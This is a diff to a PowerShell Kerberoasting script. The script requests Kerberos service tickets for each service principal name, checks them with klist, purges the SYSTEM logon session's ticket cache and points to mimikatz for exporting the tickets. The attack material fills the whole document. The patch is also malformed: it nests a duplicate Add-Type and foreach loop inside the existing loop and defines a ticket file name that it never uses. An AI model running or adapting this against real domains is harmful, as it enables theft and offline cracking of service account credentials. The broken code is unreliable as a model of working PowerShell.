@@ -13,8 +13,24 @@ foreach ($spn in $SPNs) {
     $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
 
     # Quietly export ticket
-    klist.exe purge | Out-Null
-    Invoke-WebRequest -UseDefaultCredentials -Uri ("http://" + ($spn.Split("/")[1].Split(':')[0])) -ErrorAction SilentlyContinue | Out-Null
+Add-Type -AssemblyName System.IdentityModel
+
+foreach ($spn in $SPNs) {
+    Write-Host "[+] Requesting ticket for SPN: $spn"
+    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+
+    # Export directly from the ticket cache
+    $ticketFileName = "$($spn.Replace('/','_').Replace(':','_')).kirbi"
+    $ticketOutput = klist.exe tickets | Out-String
+
+    if ($ticketOutput -match [regex]::Escape($spn)) {
+        Write-Host "[+] Ticket successfully requested for $spn"
+        klist.exe purge -li 0x3e7 -f
+        # Export tickets using mimikatz or built-in tools if allowed
+    } else {
+        Write-Warning "[-] Could not request ticket for $spn. Check SPN validity."
+    }
+}
 
     # Locate the cached ticket
     $ticketCache = "$env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache\"
